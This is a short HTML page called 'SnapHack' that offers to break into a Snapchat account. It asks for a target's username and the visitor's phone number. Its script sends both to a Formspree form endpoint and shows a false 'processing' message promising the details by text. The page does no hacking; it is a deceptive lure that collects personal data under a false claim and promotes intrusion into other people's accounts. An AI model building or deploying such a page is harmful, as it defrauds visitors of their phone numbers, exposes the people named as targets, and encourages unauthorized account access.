<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>SnapHack</title>
  <style>
    body {
      background-color: black;
      color: red;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 40px;
    }
    h1 {
      font-size: 3em;
      margin-bottom: 20px;
    }
    form, #confirmation {
      background-color: #111;
      padding: 20px;
      border-radius: 10px;
      display: inline-block;
    }
    input, button {
      display: block;
      width: 280px;
      margin: 15px auto;
      padding: 10px;
      font-size: 1em;
      border: none;
      border-radius: 5px;
    }
    input {
      background-color: #222;
      color: white;
    }
    button {
      background-color: red;
      color: white;
      cursor: pointer;
    }
    #confirmation {
      display: none;
      margin-top: 30px;
    }
    .instructions {
      font-size: 1.1em;
      margin-bottom: 30px;
    }
  </style>
</head>
<body>

  <h1>SnapHack</h1>
  <p class="instructions">
    Enter the <strong>target's Snapchat username</strong><br>
    and <strong>your phone number</strong> to receive the info when it's ready.
  </p>

  <form id="hackForm">
    <input type="text" name="snapchat_username" placeholder="Target's Snapchat Username" required>
    <input type="text" name="phone_number" placeholder="Your Phone Number" required>
    <button type="submit">Start</button>
  </form>

  <div id="confirmation">
    <h2>Info is being processed...</h2>
    <p>You will receive a text with the details once complete.</p>
  </div>

  <script>
    const form = document.getElementById('hackForm');
    form.addEventListener('submit', function(event) {
      event.preventDefault(); // Prevent page reload

      const formData = new FormData(form);

      fetch("https://formspree.io/f/xyzeazor", {
        method: "POST",
        body: formData,
        headers: {
          'Accept': 'application/json'
        }
      }).then(response => {
        form.style.display = 'none';
        document.getElementById('confirmation').style.display = 'block';
      }).catch(error => {
        alert("Something went wrong.");
        console.error(error);
      });
    });
  </script>

</body>
</html>
